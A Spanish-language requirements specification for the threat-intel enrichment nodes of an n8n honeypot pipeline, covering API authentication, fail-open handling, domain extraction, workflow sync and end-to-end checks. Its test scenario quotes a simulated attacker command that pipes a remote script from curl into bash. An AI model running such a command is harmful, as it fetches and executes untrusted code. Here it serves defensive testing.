# Enriquecimiento Externo

## Purpose

Define el contrato de autenticación, semántica fail-open, sincronización y verificación de los 4 nodos de threat-intelligence de la cadena honeypots→n8n: "AbuseIPDB Lookup" y "Shodan Lookup" (PB-H1) y "VirusTotal Lookup" y "WHOIS Domain" (PB-H2), de modo que el riesgo se calcule con datos reales de las APIs externas sin interrumpir nunca la ingesta ni la persistencia.

## Requirements

### Requirement: Los nodos de enriquecimiento SHALL autenticarse mediante credenciales genéricas existentes de n8n

Los nodos HTTP de threat-intel SHALL referenciar las credenciales genéricas reales de la instancia viva: "AbuseIPDB Lookup" → `httpHeaderAuth` id `JWpZExG5LldjAXXK` ("AbuseIPDB_API"); "VirusTotal Lookup" → `httpHeaderAuth` id `znTR0Vhc1NPWwvmQ` ("VirusTotal_API"); "WHOIS Domain" → `httpQueryAuth` id `1z0sMIFlttji5qxS` ("Whois_API"). El nodo "Shodan Lookup" opera SIN credenciales (acceso anónimo por decisión de diseño: plan Shodan oss sin query_credits). Todo nodo que use credenciales genéricas SHALL declarar además `"authentication": "genericCredentialType"` junto al `"genericAuthType"` correspondiente (`httpHeaderAuth`/`httpQueryAuth`); sin ambos parámetros n8n ignora silenciosamente la credencial adjunta. Los nodos NO SHALL contener parámetros manuales de autenticación cuyos valores usen expresiones `$credentials[...]["apiKey"]`.

#### Scenario: Petición a AbuseIPDB autenticada y exitosa

- **WHEN** PB-H1 procesa un evento con `src_ip` válido y se inspecciona la salida del nodo "AbuseIPDB Lookup"
- **THEN** la petición incluye el header `Key` inyectado por la credencial `httpHeaderAuth`
- **AND** la respuesta es un cuerpo real de AbuseIPDB (con `data.abuseConfidenceScore`) y no un payload de error 401/403

#### Scenario: Sin expresiones rotas en los JSON versionados

- **WHEN** se inspeccionan `workflows/pb-h1-reconocimiento-v1.0.json` y `workflows/b-h2-ejecucion-comandos-v1.0.json`
- **THEN** ningún nodo contiene la cadena `$credentials[` en sus parámetros de envío (headers/query)
- **AND** los bloques `credentials` de los nodos usan exclusivamente los IDs reales listados arriba

#### Scenario: Referencia a credencial inexistente rechazada

- **WHEN** un nodo de enriquecimiento referencia un id de credencial que no existe en la instancia viva
- **THEN** el cambio NO se considera completo y el PUT no se realiza hasta corregir la referencia

### Requirement: El rewire SHALL preservar los parámetros no-auth y la semántica fail-open

La eliminación de parámetros manuales SHALL limitarse a las entradas de autenticación rota. SHALL conservarse: el header `Accept: application/json` en "AbuseIPDB Lookup"; `sendQuery: true` con los parámetros `domainName` y `whois=live` en "WHOIS Domain" (endpoint vigente `GET https://api.whoisfreaks.com/v2.0/whois/live`); las URLs y expresiones de negocio; los reintentos de "VirusTotal Lookup" (`retryOnFail: true`, `maxTries: 3`, espera entre intentos). Los nodos SHALL mantener `onError: continueRegularOutput`, de modo que un fallo o ausencia de cualquier API externa nunca interrumpa la ingesta, la respuesta 200 del webhook ni la persistencia del evento (Camino B).

#### Scenario: API externa caída durante el procesamiento

- **WHEN** cualquiera de las APIs de enriquecimiento falla o agota reintentos durante una ejecución
- **THEN** la ejecución continúa por la salida regular del nodo afectado
- **AND** el webhook responde 200 y el evento queda persistido en PostgreSQL con enriquecimiento parcial o nulo

#### Scenario: Parámetros de negocio intactos tras el rewire

- **WHEN** se compara el JSON post-edición contra el original
- **THEN** solo cambian los bloques `credentials` y desaparecen las entradas auth manuales listadas en design.md (D1)
- **AND** `Accept`, `domainName`, URLs, reintentos y `onError` permanecen idénticos

### Requirement: La extracción de dominios SHALL producir IoCs limpios para los lookups

El nodo "Extraer IOCs" SHALL derivar los dominios del comando mediante captura de grupos (`matchAll`) y no mediante `String.match()` global (que devuelve el match completo contaminado con el esquema, p. ej. `http://github.com`). Los nodos consumidores ("VirusTotal Lookup", "WHOIS Domain") SHALL resolver el dominio desde los ítems de "Dividir Dominios" (referencia nominal `$('Dividir Dominios')`), ya que su input directo puede ser la respuesta de otro lookup sin los campos del evento.

#### Scenario: Dominio con esquema en el comando

- **WHEN** el comando contiene una URL como `http://github.com/payload.sh`
- **THEN** `extracted_domains` contiene valores limpios (`github.com`, `payload.sh`) sin prefijo de esquema
- **AND** las llamadas a VirusTotal/WhoisFreaks usan el dominio limpio y reciben respuestas 200

### Requirement: La sincronización SHALL preservar IDs de nodos y el estado de activación vivo

La re-sincronización vía `PUT /api/v1/workflows/{id}` (payload `{name,nodes,connections,settings}` enviado como bytes UTF-8) SHALL preservar los IDs de workflows y de todos los nodos. Tras el sync, PB-H1 (`ITqYH4UNwfatkrRS`) y PB-H2 (`nFnt9n3Gk8Gh27mg`) SHALL permanecer activos (`active: true`) en la instancia viva.

#### Scenario: Verificación post-sync por API

- **WHEN** se consulta `GET /api/v1/workflows/ITqYH4UNwfatkrRS` y `GET /api/v1/workflows/nFnt9n3Gk8Gh27mg` tras el PUT
- **THEN** ambos workflows reportan `active: true`
- **AND** los IDs de los nodos rewireados (`http-abuseipdb`, `http-shodan`, `http-virustotal`, `http-whois`) permanecen sin cambios

#### Scenario: Auditoría pre-sync de nodos no relacionados

- **WHEN** se comparan los bloques `credentials` de los nodos no-enriquecimiento (Postgres, Slack, Firewall, GLPI) entre el JSON versionado y el workflow vivo
- **THEN** cualquier discrepancia se corrige en el JSON versionado con los valores vivos ANTES de ejecutar el PUT
- **AND** el PUT no introduce referencias de credenciales que no existan en la instancia viva

### Requirement: La verificación E2E SHALL evidenciar enriquecimiento real con persistencia

Un evento Cowrie sintético enviado a `POST /webhook/cowrie` SHALL producir: respuesta HTTP 200, una ejecución en n8n donde los nodos de enriquecimiento reporten éxito con datos reales de las APIs (no errores de autenticación) y una fila nueva en `honeypot_events` en PostgreSQL cuyo `enrichment_data` combine las fuentes (merge jsonb no regresivo: ABUSEIPDB/SHODAN insertadas por PB-H1 tras "Calcular Risk Score"; vt_detections/domain_age_days/command_risk_tier actualizadas por PB-H2 con `COALESCE(...) || $2` y `GREATEST` en risk_score). La evidencia SHALL registrarse (id de ejecución, salidas de nodos, fila de BD).

#### Scenario: Evento sintético produce evidencia completa

- **WHEN** se envía un POST JSON válido (misma forma que eventos Cowrie reales: `src_ip`, comando, sesión) a `http://localhost:5678/webhook/cowrie`
- **THEN** la respuesta es HTTP 200 con estado `processed`
- **AND** la ejecución correspondiente muestra los nodos de enriquecimiento con salidas exitosas conteniendo datos reales de reputación
- **AND** existe una fila nueva en `honeypot_events` para el `src_ip` del evento sintético con `enrichment_data` combinado y `risk_score` no regresivo

#### Scenario: Evidencia de referencia (fila 98)

- **WHEN** se consulta la fila generada por el E2E de cierre (`curl http://github.com/payload.sh | bash` desde `45.33.32.156`)
- **THEN** `enrichment_data` contiene `abuseipdb{abuse_confidence,country,isp}`, `shodan{org,ports_count,ports_sample,country}`, `vt_detections` y `domain_age_days` reales
